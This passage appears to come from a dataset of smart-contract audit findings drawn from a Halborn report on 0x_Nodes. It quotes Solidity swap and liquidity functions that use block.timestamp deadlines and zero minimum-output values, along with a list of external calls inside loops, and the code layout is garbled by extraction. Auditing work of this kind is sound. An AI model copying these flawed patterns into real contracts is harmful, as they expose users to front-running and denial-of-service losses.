IERC20MetadataUpgradeable ( tokenIn ); if ( isMultihopPair [ tokenIn ][ tokenOut ]) { Path memory path = getPathFor ( tokenIn , tokenOut ); IUniswapSwapRouter . ExactInputParams memory params = IUniswapSwapRouter . ExactInputParams ({ path : abi . encodePacked ( path . tokenIn , path . firstPoolFee , path . tokenInTokenOut , path . secondPoolFee , path . tokenOut ) , recipient : recipient , deadline : block . timestamp , amountIn : amountIn , amountOutMinimum : 0 }) ; // Executes the swap . try IUniswapSwapRouter ( swapRouterAddress ). exactInput ( params ) { tradeSuccess = true ; } catch { tradeSuccess = false ; tokenInErc20 . safeTransfer ( recipient , tokenInErc20 . balanceOf ( address ( this )) ); } return tradeSuccess ; } ( address token0 , address token1 ) = getTokensSorted ( tokenIn , 30 tokenOut ); require ( pools [ token0 ][ token1 ]. length > 0, \" UniswapTrader :: swapExactInput : Pool has not been added \" ); require ( tokenInErc20 . balanceOf ( address ( this )) >= amountIn , \" UniswapTrader :: swapExactInput : Balance is less than trade amount \" ); uint256 amountOutMinimum = getAmountOutMinimum ( tokenIn , tokenOut , amountIn ); IUniswapSwapRouter . ExactInputSingleParams memory exactInputSingleParams ; exactInputSingleParams . tokenIn = tokenIn ; exactInputSingleParams . tokenOut = tokenOut ; exactInputSingleParams . fee = pools [ token0 ][ token1 ][0]. feeNumerator ; exactInputSingleParams . recipient = recipient ; exactInputSingleParams . deadline = block . timestamp ; exactInputSingleParams . amountIn = amountIn ; exactInputSingleParams . amountOutMinimum = amountOutMinimum ; exactInputSingleParams . sqrtPriceLimitX96 = 0; ... } 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 31 Listing 14: UniswapTrader.sol (Lines 388,422) 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 function swapExactOutput ( address tokenIn , address tokenOut , address recipient , uint256 amountOut ) external override onlyController returns ( bool tradeSuccess ) { IERC20MetadataUpgradeable tokenInErc20 = IERC20MetadataUpgradeable ( tokenIn ); if ( isMultihopPair [ tokenIn ][ tokenOut ]) { Path memory path = getPathFor ( tokenIn , tokenOut ); IUniswapSwapRouter . ExactOutputParams memory params = IUniswapSwapRouter . ExactOutputParams ({ path : abi . encodePacked ( path . tokenIn , path . firstPoolFee , path . tokenInTokenOut , path . secondPoolFee , path . tokenOut ) , recipient : recipient , deadline : block . timestamp , amountOut : amountOut , amountInMaximum : 0 }) ; // Executes the swap . try IUniswapSwapRouter ( swapRouterAddress ). exactOutput ( params ) { tradeSuccess = true ; } catch { tradeSuccess = false ; tokenInErc20 . safeTransfer ( recipient , tokenInErc20 . balanceOf ( address ( this )) ); } return tradeSuccess ; } ( address token0 , address token1 ) = getTokensSorted ( tokenIn , tokenOut ); 32 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 require ( pools [ token0 ][ token1 ][0]. feeNumerator > 0, \" UniswapTrader :: swapExactOutput : Pool has not been added \" ); uint256 amountInMaximum = getAmountInMaximum ( tokenIn , tokenOut , amountOut ); require ( tokenInErc20 . balanceOf ( address ( this )) >= amountInMaximum , \" UniswapTrader :: swapExactOutput : Balance is less than trade amount \" ); IUniswapSwapRouter . ExactOutputSingleParams memory exactOutputSingleParams ; exactOutputSingleParams . tokenIn = tokenIn ; exactOutputSingleParams . tokenOut = tokenOut ; exactOutputSingleParams . fee = pools [ token0 ][ token1 ][0]. feeNumerator ; exactOutputSingleParams . recipient = recipient ; exactOutputSingleParams . deadline = block . timestamp ; exactOutputSingleParams . amountOut = amountOut ; exactOutputSingleParams . amountInMaximum = amountInMaximum ; exactOutputSingleParams . sqrtPriceLimitX96 = 0; ... } 33 Listing 15: DynamicRangeOrdersIntegration.sol (Lines 517) 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 function rerangeLiquidityPosition ( bytes32 liquidityPositionKey ) public onlyController { uint256 positionActualBaseStablecoinValue = getPositionBaseStablecoinValue ( liquidityPositionKey ); dynamicRangeOrdersIntegrationDeployer . decreaseLiquidityPosition ( liquidityPositionKey , positionActualBaseStablecoinValue ); ( uint256 amount0Desired , uint256 amount1Desired ) = getIncreaseLiquidityAmounts ( liquidityPositionKey , liquidityPositionKeyIndexes [ liquidityPositionKey ] ); if ( amount0Desired > 0 || amount1Desired > 0) { ( bool success , uint256 liquidityPositionId ) = dynamicRangeOrdersIntegrationDeployer . mintLiquidityPosition ( liquidityPositions [ liquidityPositionKey ]. token0 , liquidityPositions [ liquidityPositionKey ]. token1 , liquidityPositions [ liquidityPositionKey ]. feeNumerator , liquidityPositions [ liquidityPositionKey ]. tickLower , liquidityPositions [ liquidityPositionKey ]. tickUpper , amount0Desired , amount1Desired ); // If the mint succeeded , update the liquidity position data if ( success ) { liquidityPositions [ liquidityPositionKey ]. minted = true ; liquidityPositions [ liquidityPositionKey ]. id = liquidityPositionId ; 34 514 515 516 517 518 } } } lastRerangeTimestamp [ liquidityPositionKey ] = block . timestamp ; 35 Listing 16: DynamicRangeOrdersIntegrationDeployer.sol (Lines 228) ) address token0 , address token1 , uint24 fee , int24 tickLower , int24 tickUpper , uint256 amount0Desired , uint256 amount1Desired 184 function mintLiquidityPosition ( 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 if ( ) { { external override onlyController returns ( bool success , uint256 liquidityPositionId ) amount0Desired > IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this )) amount0Desired = IERC20MetadataUpgradeable ( token0 ). balanceOf 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 ( address ( this ) ); } if ( amount1Desired > IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this )) ) { amount1Desired = IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this ) ); } IUniswapPositionManager . MintParams memory mintParams ; mintParams . token0 = token0 ; mintParams . token1 = token1 ; mintParams . fee = fee ; mintParams . tickLower = tickLower ; mintParams . tickUpper = tickUpper ; mintParams . amount0Desired = amount0Desired ; mintParams . amount1Desired = amount1Desired ; 36 225 226 227 228 229 230 mintParams . amount0Min = 0; mintParams . amount1Min = 0; mintParams . recipient = address ( this ); mintParams . deadline = block . timestamp ; ... } 37 Listing 17: SushiSwapIntegration.sol (Lines 211) 169 function _deploy ( uint256 amount , uint256 pid ) internal { 170 ISushiSwapIntegration . InnerPool memory innerPoolInfo = 171 172 173 getPoolInfo ( pid ); require ( innerPoolInfo . added , \" SushiSwapIntegration :: deposit to sushiSwap yield farm : pool is not configured \" ); ( uint256 priceWithMultiplier , uint256 decimalsSubtractionExponent ) = getPriceWithMultiplier ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ) , address ( innerPoolInfo . poolInfo . lpToken ) , innerPoolInfo . tokenPair . token0 ); 174 ( uint256 amountTokenDesired , uint256 amountTokenMin , 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 uint256 amountWeiMin ) = calculateAmountOfTokenToAddLiquidityETH ( amount / 2, priceWithMultiplier ); uint256 tokensReceived ; if ( IERC20MetadataUpgradeable ( IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . getWethTokenAddress () ). balanceOf ( address ( this )) < amount ) { return ; } IWeth9 ( IIntegrationMap ( moduleMap . getModuleAddress ( Modules . IntegrationMap )) . getWethTokenAddress () ). withdraw ( amount ); if ( IERC20MetadataUpgradeable ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 )) . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) < amountTokenDesired / decimalsSubtractionExponent ) { uint [] memory amounts = swapExactETHForTokens ( amount / 2, (( amountTokenDesired - ( amountTokenDesired * 1 / 100) ) / decimalsSubtractionExponent ) , wethAddress , getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ) , address ( this ) ); 38 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 tokensReceived = amounts [1]; emit TokensReceived ( tokensReceived ); ( priceWithMultiplier ,) = getPriceWithMultiplier ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ) , address ( innerPoolInfo . poolInfo . lpToken ) , innerPoolInfo . tokenPair . token0 ); ( amountTokenDesired , amountTokenMin , amountWeiMin ) = calculateAmountOfTokenToAddLiquidityETH ( amount / 2, priceWithMultiplier ); } IERC20MetadataUpgradeable ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 )) . safeApprove ( swapRouterAddress , 0) ; IERC20MetadataUpgradeable ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 )) . safeApprove ( swapRouterAddress , IERC20MetadataUpgradeable ( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 )) . allowance ( address ( this ) , swapRouterAddress ) + ( tokensReceived == 0 ? amountTokenDesired / decimalsSubtractionExponent : tokensReceived )) ; uint256 diff = amountTokenDesired / decimalsSubtractionExponent - ( tokensReceived == 0 ? amountTokenDesired / decimalsSubtractionExponent : tokensReceived ); (,, uint256 liquidity ) = ISushiSwapRouter ( swapRouterAddress ). addLiquidityETH { value : amount / 2}( getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ) , ( amountTokenDesired / decimalsSubtractionExponent ) - diff , ( amountTokenMin / decimalsSubtractionExponent ) , amountWeiMin , address ( this ) , block . timestamp + 360 ); ...} 39 Listing 18: SushiSwapIntegration.sol (Lines 353) 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 function _withdraw ( uint256 poolid , uint amountPercent ) internal returns ( uint256 ) { uint256 liquidity = ISushiSwapMasterChef ( masterChef ). userInfo ( poolid , address ( this )) . amount * amountPercent / 10000; ISushiSwapIntegration . InnerPool memory innerPoolInfo = getPoolInfo ( poolid ); ISushiSwapMasterChef ( masterChef ). withdraw ( poolid , liquidity ); IERC20MetadataUpgradeable ( address ( innerPoolInfo . poolInfo . lpToken )) . safeApprove ( swapRouterAddress , liquidity ); address token = getTokenToAdd ( innerPoolInfo . tokenPair . token0 , innerPoolInfo . tokenPair . token1 ); ( uint256 priceWithMultiplier , uint256 decimalsSubtractionExponent ) = getPriceWithMultiplier ( token , address ( innerPoolInfo . poolInfo . lpToken ) , innerPoolInfo . tokenPair . token0 ); (, uint256 amountTokenMin , uint256 amountWeiMin ) = calculateAmountOfTokenToAddLiquidityETH ( poolBalances [ poolid ] / 2 , priceWithMultiplier ); ( uint amountToken , ) = ISushiSwapRouter ( swapRouterAddress ) . removeLiquidityETH ( token , liquidity , amountTokenMin / decimalsSubtractionExponent , amountWeiMin , address ( this ) , block . timestamp + 360 ); ...} 40 Listing 19: SushiSwapIntegration.sol (Lines 372) 362 363 364 365 366 367 368 369 370 371 372 373 374 function swapExactETHForTokens ( uint256 amountWei , uint256 amountOutMin , address tokenIn , address tokenOut , address to ) internal returns ( uint [] memory ) { address [] memory path = new address [](2) ; path [0] = tokenIn ; path [1] = tokenOut ; uint256 deadline = block . timestamp ; return ISushiSwapRouter ( swapRouterAddress ). swapExactETHForTokens { value : amountWei }( amountOutMin , path , to , deadline ); 375 } Listing 20: SushiSwapIntegration.sol (Lines 391) 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 function swapExactInput ( address tokenIn , address tokenOut , address recipient , uint256 amountIn ) public override onlyController returns ( uint [] memory ) { uint256 amountOutMin = getAmountOutMinimum ( tokenIn , tokenOut , amountIn ); address [] memory path = new address [](2) ; path [0] = tokenIn ; path [1] = tokenOut ; uint256 deadline = block . timestamp ; IERC20MetadataUpgradeable ( tokenIn ). approve ( swapRouterAddress , amountIn ); return ISushiSwapRouter ( swapRouterAddress ). swapExactTokensForTokens ( amountIn , amountOutMin , path , recipient , deadline ); 396 } 41 Listing 21: UniswapIntegrationDeployer.sol (Lines 226) 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 function mintLiquidityPosition ( address token0 , address token1 , uint24 fee , int24 tickLower , int24 tickUpper , uint256 amount0Desired , uint256 amount1Desired ) { external override onlyController returns ( bool success , uint256 liquidityPositionId ) if ( amount0Desired > IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this )) ) { amount0Desired = IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this ) ); } if ( amount1Desired > IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this )) ) { amount1Desired = IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this ) ); } IUniswapPositionManager . MintParams memory mintParams ; mintParams . token0 = token0 ; mintParams . token1 = token1 ; mintParams . fee = fee ; mintParams . tickLower = tickLower ; mintParams . tickUpper = tickUpper ; mintParams . amount0Desired = amount0Desired ; mintParams . amount1Desired = amount1Desired ; 42 223 224 225 226 227 228 mintParams . amount0Min = 0; mintParams . amount1Min = 0; mintParams . recipient = address ( this ); mintParams . deadline = block . timestamp ; ... } 43 Listing 22: UniswapIntegrationDeployer.sol (Lines 277) 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 function increaseLiquidityPosition ( uint256 liquidityPositionId , address token0 , address token1 , uint256 amount0Desired , uint256 amount1Desired ) external override onlyController returns ( bool success ) { if ( amount0Desired > IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this )) ) { amount0Desired = IERC20MetadataUpgradeable ( token0 ). balanceOf ( address ( this ) ); } if ( amount1Desired > IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this )) ) { amount1Desired = IERC20MetadataUpgradeable ( token1 ). balanceOf ( address ( this ) ); } IUniswapPositionManager . IncreaseLiquidityParams memory increaseLiquidityParams ; increaseLiquidityParams . tokenId = liquidityPositionId ; increaseLiquidityParams . amount0Desired = amount0Desired ; increaseLiquidityParams . amount1Desired = amount1Desired ; increaseLiquidityParams . amount0Min = 0; increaseLiquidityParams . amount1Min = 0; increaseLiquidityParams . deadline = block . timestamp ; ... } 44 Listing 23: UniswapIntegrationDeployer.sol (Lines 450) function decreaseLiquidityPosition ( uint256 liquidityPositionIndex , uint256 baseStablecoinValue ) public override onlyController returns ( bool success ) { (, , , , , , uint256 liquidityPositionId , ) = uniswapIntegration . getLiquidityPosition ( liquidityPositionIndex ); ( , , , , , , , uint128 currentLiquidity , , , uint128 tokensOwed0Before , uint128 tokensOwed1Before ) = IUniswapPositionManager ( positionManagerAddress ). positions ( liquidityPositionId ); if ( uniswapIntegration . getPositionBaseStablecoinValue ( liquidityPositionIndex ) > 0 ) { uint128 reduceLiquidityAmount = uint128 ( (( baseStablecoinValue ) * currentLiquidity ) / uniswapIntegration . getPositionBaseStablecoinValue ( liquidityPositionIndex ) ); if ( reduceLiquidityAmount > currentLiquidity ) { reduceLiquidityAmount = currentLiquidity ; } IUniswapPositionManager . DecreaseLiquidityParams memory decreaseLiquidityParams ; 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 45 446 447 448 449 450 451 452 decreaseLiquidityParams . tokenId = liquidityPositionId ; decreaseLiquidityParams . liquidity = reduceLiquidityAmount ; decreaseLiquidityParams . amount0Min = 0; decreaseLiquidityParams . amount1Min = 0; decreaseLiquidityParams . deadline = block . timestamp ; ... } Risk Level: Likelihood - 2 Impact - 3 Recommendation: Use block.number instead of block.timestamp or now to reduce the risk of Maximal Extractable Value (MEV) attacks. Check if the timescale of the If project occurs across years, days and months rather than seconds. possible, it is recommended to use Oracles. Remediation Plan: NOT APPLICABLE: 0x_nodes considers the usage of block.timestamp safe, since the primary use of timestamps in the system is used by the offchain processor when scheduling updates and fund deployment. The functions that use these timestamps are secured via openzeppelin Ownable, and cannot be exploited by a miner. They are also intended to function on a scale of hours, not seconds. 46 ",
        "labels": [
            "Halborn",
            "0x_Nodes",
            "Severity: Low"
        ]
    },
    {
        "title": "EXTERNAL FUNCTION CALLS WITHIN LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/0x_Nodes_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are many instances within contracts that use external function calls within a loop. Calls inside a loop might lead to a denial-of-service attack. Code Location: Listing 24: BiosRewards.sol (Lines ) 1 BiosRewards . getUserBiosRewards ( address ) ( contracts / core / BiosRewards . sol #141 -160) has external calls inside a loop : tokenId < integrationMap . getTokenAddressesLength () ( contracts / core / BiosRewards . sol #154 -156) 2 BiosRewards . getUserBiosRewards ( address ) ( contracts / core / BiosRewards . sol #141 -160) has external calls inside a loop : userBiosRewards += earned ( integrationMap . getTokenAddress ( tokenId ) , account ) ( contracts / core / BiosRewards . sol #156 -160) 3 EtherRewards . claimEthRewards ( address ) ( contracts / core / EtherRewards . sol #76 -90) has external calls inside a loop : token = IIntegrationMap ( integrationMap ). getTokenAddress ( tokenId ) ( contracts / core / EtherRewards . sol #87) 4 EtherRewards . getUserEthRewards ( address ) ( contracts / core / EtherRewards . sol #131 -145) has external calls inside a loop : token = IIntegrationMap ( integrationMap ). getTokenAddress ( tokenId ) ( contracts / core / EtherRewards . sol #142) 5 StrategyMap . updateIntegrations ( uint256 , IStrategyMap . WeightedIntegration []) ( contracts / core / StrategyMap . sol #121 -193) has external calls inside a loop : token = integrationMap . getTokenAddress ( i_scope_1 ) ( contracts / core / StrategyMap . sol #164) 6 StrategyMap . deleteStrategy ( uint256 ) ( contracts / core / StrategyMap . sol #195 -226) has external calls inside a loop : require ( bool , string )( getStrategyTokenBalance ( id , integrationMap . getTokenAddress ( i)) == 0, Strategy in use ) ( contracts / core / StrategyMap . sol #204 -207) 7 StrategyMap . enterStrategy ( uint256 , address , address [] , uint256 []) ( contracts / core / StrategyMap . sol #276 -312) has external calls inside a loop : require ( bool , string )( integrationMap . 47 getTokenAcceptingDeposits ( tokens [i ]) , Token unavailable ) ( contracts / core / StrategyMap . sol #294 -297) 8 StrategyMap . enterStrategy ( uint256 , address , address [] , uint256 []) ( contracts / core / StrategyMap . sol #276 -312) has external calls inside a loop : require ( bool , string )( userPositions . userTokenBalance ( tokens [ i], user ) >= amounts [ i], User lacks funds ) ( contracts / core / StrategyMap . sol #300 -303) 9 StrategyMap . exitStrategy ( uint256 , address , address [] , uint256 []) ( contracts / core / StrategyMap . sol #314 -345) has external calls inside a loop : require ( bool , string )( integrationMap . getTokenAcceptingWithdrawals ( tokens [i ]) , Token unavailable ) ( contracts / core / StrategyMap . sol #331 -334) 10 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : require ( bool , string )( integrationMap . getTokenAcceptingDeposits ( tokens [ tokenId ]) , UserPositions :: deposit : This token is not accepting deposits ) ( contracts / core / UserPositions . sol #110 -113) 11 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : beforeBalance = erc20 . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) ( contracts / core / UserPositions . sol #125 -127) 12 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : erc20 . safeTransferFrom ( depositor , moduleMap . getModuleAddress ( Modules . Kernel ) , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #130 -134) 13 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : afterBalance = erc20 . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) ( contracts / core / UserPositions . sol #137 -139) 14 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). increaseRewards ( tokens [ tokenId ], depositor , actualAmount ) ( contracts / core / UserPositions . sol #143 -144) 15 UserPositions . deposit ( address , address [] , uint256 [] , uint256 ) ( contracts / core / UserPositions . sol #98 -166) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )). updateUserRewards ( tokens [ tokenId ], depositor ) ( contracts / core / UserPositions . sol #145 -146) 48 16 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : require ( bool , string )( integrationMap . getTokenAcceptingWithdrawals ( tokens [ tokenId ]) , UserPositions :: _withdraw : This token is not accepting withdrawals ) ( contracts / core / UserPositions . sol #254 -257) 17 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IERC20MetadataUpgradeable ( tokens [ tokenId ]) . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) < amounts [ tokenId ] ( contracts / core / UserPositions . sol #264 -266) 18 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IERC20MetadataUpgradeable ( tokens [ tokenId ]) . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) < amounts [ tokenId ] ( contracts / core / UserPositions . sol #272 -274) 19 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : amounts [ tokenId ] = IERC20MetadataUpgradeable ( tokens [ tokenId ]) . balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) ( contracts / core / UserPositions . sol #277 -278) 20 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). decreaseRewards ( tokens [ tokenId ], recipient , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #294 -295) 21 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )). updateUserRewards ( tokens [ tokenId ], recipient ) ( contracts / core / UserPositions . sol #297 -298) 22 UserPositions . _withdraw ( address , address [] , uint256 [] , bool ) ( contracts / core / UserPositions . sol #233 -304) has external calls inside a loop : IERC20MetadataUpgradeable ( tokens [ tokenId ]) . safeTransferFrom ( moduleMap . getModuleAddress ( Modules . Kernel ) , recipient , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #286 -290) 23 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : integrationId < integrationMap . getIntegrationAddressesLength () ( contracts / core / UserPositions . sol #321) 24 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls 49 inside a loop : integrationAddress = integrationMap . getIntegrationAddress ( integrationId ) ( contracts / core / UserPositions . sol #324 -326) 25 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : desiredWithdrawAmount = ( amount * strategyMap . getIntegrationWeight ( integrationAddress )) / integrationWeightSum ( contracts / core / UserPositions . sol #327 -329) 26 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : desiredWithdrawAmount > IIntegration ( integrationAddress ). getBalance ( token ) ( contracts / core / UserPositions . sol #332 -333) 27 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : desiredWithdrawAmount = IIntegration ( integrationAddress ). getBalance ( token ) ( contracts / core / UserPositions . sol #335 -337) 28 UserPositions . closePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #308 -351) has external calls inside a loop : IIntegration ( integrationAddress ). withdraw ( token , desiredWithdrawAmount ) ( contracts / core / UserPositions . sol #340) 29 UserPositions . fullyClosePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #355 -386) has external calls inside a loop : integration = IIntegration ( integrationMap . getIntegrationAddress ( integrationId )) ( contracts / core / UserPositions . sol #365 -367) 30 UserPositions . fullyClosePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #355 -386) has external calls inside a loop : integration . withdraw ( token , integration . getBalance ( token )) ( contracts / core / UserPositions . sol #370) 31 UserPositions . fullyClosePositionsForWithdrawal ( address , uint256 ) ( contracts / core / UserPositions . sol #355 -386) has external calls inside a loop : integrationId == integrationMap . getIntegrationAddressesLength () - 1 || IERC20MetadataUpgradeable ( token ). balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) >= amount ( contracts / core / UserPositions . sol #373 -377) 32 UserPositions . transferToStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #394 -428) has external calls inside a loop : IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). decreaseRewards ( tokens [ tokenId ], recipient , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #418 -419) 50 33 UserPositions . transferToStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #394 -428) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )). updateUserRewards ( tokens [ tokenId ], recipient ) ( contracts / core / UserPositions . sol #421 -422) 34 UserPositions . transferFromStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #436 -465) has external calls inside a loop : require ( bool , string )( integrationMap . getTokenAcceptingDeposits ( tokens [ tokenId ]) , UserPositions :: deposit : This token is not accepting deposits ) ( contracts / core / UserPositions . sol #446 -449) 35 UserPositions . transferFromStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #436 -465) has external calls inside a loop : IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). increaseRewards ( tokens [ tokenId ], recipient , amounts [ tokenId ]) ( contracts / core / UserPositions . sol #456 -457) 36 UserPositions . transferFromStrategy ( address , address [] , uint256 []) ( contracts / core / UserPositions . sol #436 -465) has external calls inside a loop : IEtherRewards ( moduleMap . getModuleAddress ( Modules . EtherRewards )). updateUserRewards ( tokens [ tokenId ], recipient ) ( contracts / core / UserPositions . sol #458 -459) 37 UserPositions . _increaseBiosRewards () ( contracts / core / UserPositions . sol #473 -506) has external calls inside a loop : token = integrationMap . getTokenAddress ( tokenId ) ( contracts / core / UserPositions . sol #498) 38 UserPositions . _increaseBiosRewards () ( contracts / core / UserPositions . sol #473 -506) has external calls inside a loop : tokenBiosRewardWeight = integrationMap . getTokenBiosRewardWeight ( token ) ( contracts / core / UserPositions . sol #499 -501) 39 UserPositions . _claimBiosRewards ( address ) ( contracts / core / UserPositions . sol #561 -590) has external calls inside a loop : token = integrationMap . getTokenAddress ( tokenId ) ( contracts / core / UserPositions . sol #575) 40 UserPositions . _claimBiosRewards ( address ) ( contracts / core / UserPositions . sol #561 -590) has external calls inside a loop : biosRewards . earned ( token , recipient ) > 0 ( contracts / core / UserPositions . sol #577) 41 UserPositions . _claimBiosRewards ( address ) ( contracts / core / UserPositions . sol #561 -590) has external calls inside a loop : biosClaimed += IBiosRewards ( moduleMap . getModuleAddress ( Modules . BiosRewards )). claimReward ( token , recipient ) ( contracts / core / UserPositions . sol #578 -580) 42 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : integration = 51 integrationMap . getIntegrationAddress ( i ) ( contracts / core / YieldManager . sol #152) 43 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : token = integrationMap . getTokenAddress (j ) ( contracts / core / YieldManager . sol #154) 44 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : numerator = integrationMap . getTokenReserveRatioNumerator ( token ) ( contracts / core / YieldManager . sol #155) 45 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : grossAmountInvested = strategyMap . getExpectedBalance ( integration , token ) ( contracts / core / YieldManager . sol #157 -160) 46 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : actualBalance = IIntegration ( integration ). getBalance ( token ) ( contracts / core / YieldManager . sol #165) 47 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : IERC20MetadataUpgradeable ( token ). balanceOf ( moduleMap . getModuleAddress ( Modules . Kernel )) >= shortage ( contracts / core / YieldManager . sol #172 -174) 48 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : balanceBefore = IERC20MetadataUpgradeable ( token ). balanceOf ( integration ) ( contracts / core / YieldManager . sol #176 -178) 49 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : IERC20MetadataUpgradeable ( token ). safeTransferFrom ( moduleMap . getModuleAddress ( Modules . Kernel ) , integration , shortage ) ( contracts / core / YieldManager . sol #179 -183) 50 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : balanceAfter = IERC20MetadataUpgradeable ( token ). balanceOf ( integration ) ( contracts / core / YieldManager . sol #184 -186) 51 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 -204) has external calls inside a loop : IIntegration ( integration ). deposit ( token , balanceAfter - balanceBefore ) ( contracts / core / YieldManager . sol #188 -191) 52 YieldManager . _rebalance () ( contracts / core / YieldManager . sol #140 